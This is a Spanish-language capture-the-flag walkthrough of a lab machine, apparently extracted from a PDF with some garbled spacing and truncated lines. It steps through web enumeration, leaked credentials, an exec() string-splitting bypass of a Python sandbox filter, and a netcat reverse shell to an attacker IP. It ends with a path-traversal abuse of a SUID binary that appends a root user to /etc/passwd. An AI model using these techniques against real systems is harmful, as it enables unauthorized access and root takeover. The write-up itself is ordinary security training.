<a name="br1"></a> 

Part I

Servicios del sistema

• Servidor web en el puerto 80

• Servidor ssh en el puerto 22

• La ip actual es 192.168.1.70

1 Mapeo de la aplicaión web

1\.1 Nikto

Realizando un escaneo con el software nikto, se encontraron las siguientes rutas

por medio del archivo robots.txt:

• /register

• /login

• /zbir7mn240soxhicso2z

El programa además arrojó el siguiente mensaje

• Apachemod\_negotiationisenabledwithMultiViews,whichallowsattackerstoeasilybruteforcefile

Sin embargo, una rápida búsqueda sugiere que este resultado podría ser un falso

positivo.

1\.2 Dirbust

Se realizó un ataque de fuerza bruta a los directorios por medio del programa

dirbuster, haciendo uso de los diccionarios pre instalados

1\.3 Cadaver

Cadaver es una aplicación que permite interactual con webdav, la cual es una

extención dep protocolo http que se encarga de la parte de manipulación de

archivos, al parecer tiene comandos similares a los usados en ftp. Sin embargo,

el servidor parece no tener habilitado esta extensión.

1\.4 Apache - users

Aparentemente es una herramienta que permite enmerar los usuarios en sistemas

con Apache UserDir module habilitado. Este módulo sirve para acceder ciertos

archivos del servidor. En este caso, se sigue un link de la forma

• http://www.example.com/users/ussername

1



<a name="br2"></a> 

donde se reemplaza “username” con los nombres encontrados por el software.

Dichos nombres son

bin e x i s t s on 192.168.1.70

daemon e x i s t s on 192.168.1.70

dbus e x i s t s on 192.168.1.70

ftp e x i s t s on 192.168.1.70

mail e x i s t s on 192.168.1.70

nobody e x i s t s on 192.168.1.70

root e x i s t s on 192.168.1.70

systemd−coredump e x i s t s on 192.168.1.70

systemd−network e x i s t s on 192.168.1.70

systemd−r e s o l v e e x i s t s on 192.168.1.70

systemd−timesync e x i s t s on 192.168.1.70

uuidd e x i s t s on 192.168.1.70

Se pueden intriducir estos nombres en burp y observar la respuesta del servi-

dor´

1\.5 Formularios

Como se mencionó en la sección 1.1, se encontraron páginas no indexadas, algu-

nas de las cuales contienen formularios. Se analizarán las peticiones al introducir

data en ellos.

1\.5.1 /zbir7mn240soxhicso2z

Dicha dirección no contiene un formulario, sin embargo ésta muestra la soguente

información

Username : steve

Password : bvbkukHAeVxtjjVH

1\.5.2 /login

El formulario recibe un nombre de usuario, contraseña y un captcha que con-

siste en una operación matemática. Usando las herramientas de desarrollador

del navegador Brave, observamos la respuesta del servidor al introducir datos

incorrectos; dicha respuesta fue de la forma:

login :1 POST http ://192.168.1.70/ login 401 ( Unauthorized )

Lo cual sugiere que el servidor usa directamente login:http para el acceso. Sin

embargo, a pesar de lo básico de esta implementación, la presencia del captcha

hace complicado un ataque de fuerza bruta.

Podemos sin embargo introducir la información encontrada en 1.5.1. En un

principio, la respuesa de la página distingue cuando el nombre de usuario es

incorrecto del caso donde sólo la contraseña lo es.

2



<a name="br3"></a> 

Después de introducir la información, la pagina nos redirige a sí misma con

el mensaje de bienvenida para el usuario. Este mensaje tiene un link embebido

que redirige al directorio

/ n8pji3yeaccqvek2uzfc

Dicho directorio tiene tres caja de texto: “program”, “standard input” y

“standard output” que de acuerdo a la página ejecuta código de Python3. In-

troducimos pues el código

text = input ( ) ;

print ( text ) ;

en “program”, que resulta en el texto

foo

en “Standard output”. Todas las cajas de texto parecen ir acorde con su nombre

1\.5.3 Ejecutando comandos de linux

La página /n8pji3yeaccqvek2uzfc muestra enque consiste el ﬁltro para la intro-

ducción de código

def check\_if\_safe ( code : s t r ) −> bool :

i f ’ import ’ in code : # import i s too d

return False

e l i f ’ os ’ in code : # os i s too dangerous

return False

e l i f ’ open ’ in code : # opening f i l e s i s also too dangerous

return False

e l s e :

return True

que signiﬁca que no es posible usar import, open ni os

Sin embargo, existe el método exec(), el cuál permite ejecutar comandos de

python dentro del mismo programa donde el comando a ejecutar se introduce a

través de una string. Esto permite dividir dicha string, burlando así el ﬁltro. Por

ejemplo, podemos usar exec para ejecutar os.system(), ejecutando así comandos

del sistema operativo.

command = " i " + "mport o" + " s ; o" + " s . system ( ’ echo Hello from the other side ! ’

una vez sabiendo la forma de ejecutar comandos del sistema operativo, pode-

mos invocar una consola inversa de netcat mediante el código

command = " i " + "mport o" + " s ; o" + " s . system ( ’ mkfifo /tmp/mwpdk ; / bin /nc 192.1

ya que nos hemos conectado, ejecutamos el siguiente comando para obtener

una versión más familiar de la consola

python3 −c ’ import pty ; pty . spawn("/ bin /bash ") ’

Una vez dentro de la consola, examinando el directorio /home, encontramos

el usuario py, el cual contiene los siguientes archivos

3



<a name="br4"></a> 

password . txt sec ret\_stuff typing typing . cc user . txt

de los cuales ninguno tiene permisos de lectura para el usuario actual (http)

. No obstante, el archivo typing es un binario con permisos de ejeución. Sigu-

iendo las indicaciones, dicho programa muestra lo siguiente

[ http@archlinux py ] $ ./ typing

Let ’ s play a game ! I f you can type the sentence below , then I ’ l l t e l l you my pass

the quick brown fox jumps over the lazy dog

the quick brown fox jumps over the lazy dog

54ezhCGaJV

Efectivamente, 54ezhCGaJV es la contraseña del usuario py. Ahora podemos

entrar haciendo uso del servidor ssh mediante el comando

ssh py@192 . 1 6 8 . 1 . 7 4

además, podemos transferir el script para checar posibles métodos de es-

calación de privilegios usando scp

scp /home/ zagorakis / linuxprivchecker . py py@192 . 1 6 8 . 1 . 7 4 : / tmp

Este script nos muestra los exploits para la versión del kernel del servidor

The following e x p l o i t s are ranked higher in probability of success because t

The following e x p l o i t s are applicable to t h i s kernel version and should be in

− MySQL 4. x /5.0 User−Defined Function Local P r i v i l e g e Escalation Exploit | | http

− Kernel i a 3 2 s y s c a l l Emulation P r i v i l e g e Escalation | | http : / /www. exploit −db . com

− CAP\_SYS\_ADMIN to root Exploit | | http : / /www. exploit −db . com/ e x p l o i t s /15916 | |

L

− CAP\_SYS\_ADMIN to Root Exploit 2 (32 and 64−bit ) | | http : / /www. exploit −db . com/ e

− Sendpage Local P r i v i l e g e Escalation | | http : / /www. exploit −db . com/ e x p l o i t s /19933

− open−time Capability file\_ns\_capable () − P r i v i l e g e Escalation Vulnerability | |

− open−time Capability file\_ns\_capable () P r i v i l e g e Escalation | | http : / /www. expl

se probaron todos los exploits sin éxito. Por otro lado, el script muestra que

hay un archivo que se puede ejecutar con privilegios de root

[+] SUID/SGID F i l e s and D i r e c t o r i e s

−rwsr−xr−x 1 root root 26128 Apr 9 19:30 /home/py/ secret\_stuff /backup

Cambiar al usuario py nos permite visualizar los archivos anteriores. El

archivo password.txt contiene la contraseña del usuario py , mientras que el

archivo user.txt contiene el hash md5 ee11cbb19052e40b07aac0ca060c23ee,

que se traduce al texto user . Por otro lado. podemos entrar al directorio

/home/py/secret\_stuff, que contiene el binario backup junto con su código

fuente backup.cc que se muestra a contunuación

#include <iostream>

#include <string >

#include <fstream>

int main (){

std : : cout<<"Enter a l i n e of text to back up : ";

4



<a name="br5"></a> 

std : : s t r i n g l i n e ;

std : : g e t l i n e ( std : : cin , l i n e ) ;

std : : s t r i n g path ;

std : : cout<<"Enter a f i l e to append the text to (must be i n s i d e the / srv /back

std : : g e t l i n e ( std : : cin , path ) ;

i f ( ! path . starts\_with ("/ srv /backups /")){

std : : cout <<"The f i l e must be i n s i d e the / srv /backups directory !\ n ";

}

e l s e {

std : : ofstream backup\_file ( path , std : : ios\_base : : app ) ;

backup\_file<<line <<’\n ’ ;

return 0;

}

}

El binario consiste pues en tomar una cadena de texto y agregarla a un

archivo cuya ubicación es introducida por el usuario, y si este archivo no existe,

se crea. Sin embargo, la ubicación del archivo debe comenzar con /srv/backups

. Es importante mencionar los permisos de los archivos en dicho directorio son

−rw−r−−r−− 1 root py

4 May 9 14:39 foo

−rw−r−−r−− 1 root root 961 May 9 14:50 ree

donde ree es un archivo previamente existente en el disco duro, mientras

que foo ha sido creado por el atacante. Podemos observar que dichos archivos

sólo tienen permisos de lectura para un usuario normal, por lo que no es posible

crear un script, también se comprobó que no se pueden cambiar los permisos de

los archivos existentes en este directorio.

Ya que se usa el método std::string, las entradas de datos no son vulner-

ables a un ataque de stack overﬂow

Sin embargo, podemos tralizar un transversal path attack para escribir en

cualquer ubicación indroduciendo un input del tipo

[ py@archlinux secret\_stuff ] $ ./ backup

Enter a l i n e of text to back up : hola networks f i l e

Enter a f i l e to append the text to (must be i n s i d e the / srv /backups directory ) :

\# Static table lookup for hostnames .

\# See hosts (5) for d e t a i l s .

hola networks f i l e

Esto nos permite sobreescribir el archivo /etc/passwd de la manera

[ py@archlinux secret\_stuff ] $ ./ backup

Enter a l i n e of text to back up : root3 :nU/fHmh15MLsY : 0 : 0 : root :/ root :/ bin /bash

Enter a f i l e to append the text to (must be i n s i d e the / srv /backups directory ) :

lo que crea el superusuario root3 con la contraseñamrcake. Finalmente, el

directorio /root puede ser visualizado

[ root@archlinux ~]# l s

root . txt

5



<a name="br6"></a> 

[ root@archlinux ~]# cat root . txt

}63 a9f0ea7bb98050796b649e85481845

6


